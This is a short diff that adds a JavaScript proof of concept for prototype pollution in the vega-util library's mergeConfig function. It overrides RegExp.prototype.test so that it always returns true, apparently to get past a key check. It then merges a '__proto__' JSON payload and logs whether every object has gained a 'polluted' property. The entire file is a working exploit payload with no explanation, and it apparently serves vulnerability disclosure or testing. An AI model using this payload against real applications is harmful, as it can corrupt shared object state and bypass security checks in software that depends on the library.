@@ -1,0 +1,7 @@
+RegExp.prototype.test = () => true;
+const util = require('vega-util');
+const config = '{style: {point: {shape: triangle-right}}}';
+const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
+console.log({}.polluted);
+util.mergeConfig(config, JSON.parse(malicious_payload));
+console.log({}.polluted);
